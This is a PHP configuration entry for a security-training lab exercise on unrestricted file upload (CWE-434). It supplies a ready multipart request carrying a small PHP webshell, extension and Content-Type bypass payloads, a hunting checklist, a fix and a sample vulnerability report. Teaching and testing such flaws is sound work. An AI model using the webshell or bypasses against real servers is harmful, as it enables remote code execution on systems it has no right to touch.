<?php
$boundary = 'FORGEBOUNDARY';
$shell = "<?php system(\$_GET['c'] ?? 'id'); ?>";
$body = "--$boundary\r\nContent-Disposition: form-data; name=\"avatar\"; filename=\"shell.php\"\r\nContent-Type: application/octet-stream\r\n\r\n$shell\r\n--$boundary--\r\n";
return [
    'order' => 50,
    'title' => 'Avatar Upload: Webshell',
    'category' => 'File Upload',
    'summary' => 'The profile avatar upload stores the file you send and serves it back.',
    'severity' => 'Critical',
    'cwe' => 'CWE-434',
    'difficulty' => 'Intermediate',
    'scenario' => 'Upload an avatar, but make it a PHP file. Once it is stored under /uploads, request it to run commands. The default request already carries a small webshell; Send it, then browse to the returned path.',
    'feature' => '/labs/upload-avatar/run',
    'request' => [
        'method' => 'POST',
        'path' => '/labs/upload-avatar/run',
        'headers' => "Content-Type: multipart/form-data; boundary=$boundary",
        'body' => $body,
    ],
    'payloads' => ['filename="shell.php"', 'filename="shell.phtml"', 'Content-Type: image/png', 'GIF89a'],
    'hints' => [
        'Send the default request. The response gives the URL where your file was stored. Request that URL with ?c=id to run a command.',
        'At Medium the server trusts the Content-Type of the uploaded part. Change the part header to Content-Type: image/png while keeping the .php filename.',
        'At High the extension blacklist misses some PHP handlers. Try filename="shell.phtml"; this server executes .phtml as PHP.',
    ],
    'debrief' => 'The server stored a file with a PHP extension and served it from a directory it executes, so requesting it ran your code. Checking the client-supplied Content-Type or a blacklist of extensions is not enough. The Secure level verifies real image bytes, forces an image extension, and gives the file a random name.',
    'root_cause' => 'An uploaded file is stored in a web-served, script-executing location with its type decided by attacker-controlled metadata or an incomplete blacklist.',
    'fix' => 'Allowlist safe extensions, verify content (getimagesize/finfo), store with a generated name outside any script-executable path, and serve uploads from a location where execution is disabled.',
    'hunting' => 'Hunt every upload: avatars, attachments, import files, logos. Try a .php payload, then bypass by changing Content-Type, using alternate extensions (.phtml, .php5, .pht, .phar), double extensions (shell.php.png), case (.PHP), and magic-byte prefixes (GIF89a). Check whether the upload directory executes scripts. Note the returned storage path.',
    'report' => "Title: Unrestricted file upload leads to remote code execution\nSeverity: Critical (CVSS 3.1 9.8, AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)\nWeakness: CWE-434\n\nSteps to reproduce:\n1. POST a multipart avatar with filename shell.php containing a PHP webshell.\n2. Note the storage path returned, e.g. /uploads/shell.php\n3. Request /uploads/shell.php?c=id and observe command output.\n\nImpact: Arbitrary code execution as the web server user.\n\nRemediation: Content verification, extension allowlist, randomized names, non-executable storage.",
];
